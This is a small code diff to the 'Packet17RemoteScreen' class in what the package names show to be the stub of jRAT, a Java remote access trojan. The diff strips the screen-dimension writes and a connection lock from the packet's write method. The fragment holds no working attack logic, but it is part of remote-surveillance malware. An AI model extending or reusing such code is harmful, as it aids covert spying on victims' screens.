@@ -3,7 +3,6 @@ package pro.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
-import pro.jrat.stub.Connection;
 
 public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 
@@ -21,12 +20,7 @@ public class Packet17RemoteScreen extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(width);
-		dos.writeInt(height);
-		dos.writeInt(x);
-		dos.writeInt(y);
-
-		Connection.lock();
+		
 	}
 
 	@Override
